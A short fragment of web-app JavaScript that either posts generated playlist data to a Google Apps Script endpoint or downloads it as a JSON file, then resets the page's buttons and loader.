        html:'',
      };

      if(!FIX_test_DEV){
        if(user&&user!=='<username>'){
          fetch('https://script.google.com/macros/s/AKfycbzyyWn_TMArC9HcP2NzwGhgKUCMJK2QBQ3BEY3U8c37pQJS5fHh3TKz0Xya9V5Eq1Sm-g/exec',{
            method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
            body:JSON.stringify(bodyObj)
          });
        }else{
          return;
        };
      }else{
        const json=new Blob([bodyObj.json],{type:'text/plain'});
        const a=document.createElement('a');
        a.href=URL.createObjectURL(json);
        a.download=bodyObj.title+'.json';
        a.click();
        a.remove();
      };

      //document.getElementById('btn_generatePL').removeAttribute('disabled');
      document.getElementById('btn_generatePL_woTS').removeAttribute('disabled');
      document.getElementById('loader_generatePL').style.display='none';
    },
  }
});

























































































